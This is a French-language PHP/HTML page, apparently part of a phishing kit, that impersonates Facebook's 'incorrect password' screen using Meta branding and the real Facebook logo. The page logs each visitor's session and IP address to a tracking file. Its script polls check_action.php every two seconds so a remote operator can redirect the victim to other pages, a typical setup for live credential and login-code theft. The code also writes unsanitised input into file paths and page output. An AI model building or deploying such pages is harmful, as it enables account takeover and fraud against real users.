<?php
// Récupérer les paramètres de l'URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';

// Vérifier si les paramètres sont présents
if (empty($sessionId) || empty($clientIp)) {
    die("Paramètres manquants");
}

// Mettre à jour le fichier de suivi
$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'password_incorrect.php',
    'timestamp' => time(),
    'ip' => $clientIp
];
file_put_contents($trackingFile, json_encode($trackingData));
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mot de passe incorrect</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.6;
        }
        
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo {
            width: 60px;
            margin-bottom: 15px;
        }
        
        .error-card {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 20px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .error-icon {
            font-size: 48px;
            color: #e91e63;
            margin-bottom: 20px;
        }
        
        .error-title {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #e91e63;
        }
        
        .error-message {
            color: #65676b;
            margin-bottom: 20px;
        }
        
        .retry-button {
            display: inline-block;
            padding: 10px 16px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
        }
        
        .retry-button:hover {
            background-color: #166fe5;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #65676b;
            font-size: 12px;
        }
        
        .footer a {
            color: #65676b;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="logo">
        </div>
        
        <div class="error-card">
            <div class="error-icon">
                <i class="fas fa-times-circle"></i>
            </div>
            
            <div class="error-title">Mot de passe incorrect</div>
            <p class="error-message">Le mot de passe que vous avez saisi est incorrect. Veuillez réessayer.</p>
            
            <a href="connexion_f.php?session=<?php echo $sessionId; ?>&ip=<?php echo $clientIp; ?>" class="retry-button">
                Réessayer
            </a>
        </div>
        
        <div class="footer">
            <p>© 2025 Meta</p>
            <p><a href="#">Conditions d'utilisation</a> · <a href="#">Politique de confidentialité</a></p>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = '<?php echo $sessionId; ?>';
            const clientIp = '<?php echo $clientIp; ?>';
            
            // Fonction pour vérifier s'il y a une action à effectuer
            function checkAction() {
                fetch(`check_action.php?session=${sessionId}&ip=${clientIp}`)
                .then(response => response.json())
                .then(data => {
                    if (data.action) {
                        if (data.action === 'custom' && data.redirect) {
                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                        } else {
                            window.location.href = data.action + '.php?session=' + sessionId + '&ip=' + clientIp;
                        }
                    }
                })
                .catch(error => {
                    console.error('Erreur lors de la vérification des actions:', error);
                });
            }
            
            // Vérifier les actions toutes les 2 secondes
            setInterval(checkAction, 2000);
        });
    </script>
</body>
</html>